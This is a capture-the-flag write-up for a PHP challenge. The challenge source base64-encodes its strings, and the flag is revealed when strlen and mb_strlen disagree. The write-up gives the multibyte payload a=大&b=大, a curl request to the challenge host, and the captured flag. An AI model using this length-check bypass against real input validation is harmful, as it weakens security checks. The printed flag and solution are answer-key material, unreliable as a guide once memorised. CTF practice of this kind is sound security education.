# Tricks 2

*Another  round of PHP Tricks, good luck.*

---

```php
<?php error_reporting(0);
if (isset($_GET['a']) && isset($_GET['b'])) {
    if (  strlen($_GET['a']) >  mb_strlen($_GET['b'], base64_decode('dXRmOA==') )) {
        if (strlen($_GET['b']) > mb_strlen($_GET['a'], base64_decode('dXRmOA=='))) {
            $u327a6c4304ad5938 = file_get_contents(base64_decode('Li4vLi4vZmxhZw=='));
            echo $u327a6c4304ad5938;
        } else {
            echo base64_decode('QWxyaWdodC4=');
        }
    } else {
        echo base64_decode('VHJ5IGhhcmRlci4=');
    }
} else {
    highlight_file(__FILE__);
    die();
} ?>
```

[strlen](https://www.php.net/manual/zh/function.strlen.php)返回的是字符串的字节数，而不是其中字符的数量.

[mb-strlen](https://www.php.net/manual/zh/function.mb-strlen.php) 用来获取字符串的长度,多字节的字符被计为1.

因此这里用多字节字符作为参数即可

**payload**: `a=大&b=大`

```shell
$ curl "https://ch6.sbug.se/?a=大&b=大"
SBCTF{d1d_y0u_kn0w_abou7_7h47?}
```

**flag:**`SBCTF{d1d_y0u_kn0w_abou7_7h47?}`